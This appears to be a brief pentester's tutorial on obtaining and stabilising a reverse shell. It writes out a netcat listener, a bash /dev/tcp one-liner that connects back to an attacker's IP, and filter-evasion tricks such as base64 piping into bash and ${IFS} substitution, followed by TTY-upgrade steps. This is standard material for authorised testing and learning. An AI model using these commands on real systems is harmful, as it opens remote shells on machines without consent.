Getting a reverse shell can be done in multiple ways and a lot of documentation on how to do this is already available. My goto cheatsheet is from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

## Getting the reverse shell

### Attacker host
On the attackers host ncat should be running. The easiest way is by using the following command: `nc -lvnp 9000` which will listen on port 9000

### Target host
On the target host one of severalcommands that could be used. The command I use the most is: `bash -i >& /dev/tcp/<ip from attacker host>/9000 0>&1`. If that doesn't work, others might. See  [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for alternatives.

Sometimes the command doesn't work directly, some tricks to get it working are:

- prepend with `bash -c` to run the command in bash itself
- encode it as base64 and run the following: `echo <base64> | bas64 -d | bash`
- replaces spaces with ${IFS}

## Upgrading the reverse shell

Once the reverse shell is connected, the shell might not really be very functional (no working history/arrow keys, not tab completion, no indicator that you are in a shell, etc.) and very fragile (a simpel CTRL+C might break the shell).

In order to get a more functional shell you might want to start bash (or any other shell that is available). This can be done in several ways and I list the once I use most often:
- `python -c 'import pty; pty.spawn("/bin/bash")'`
- `/bin/bash -i`

In order to get tab completion and arrow keys working, you can use the following method:
(source: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

- Press CTRL+Z to send the reverse shell to the background
- Run the following command: `stty raw -echo`
- Execute `fg` to get back to the reverse shell

Sometimes, this doesn't work and you are stuck with a partial shell...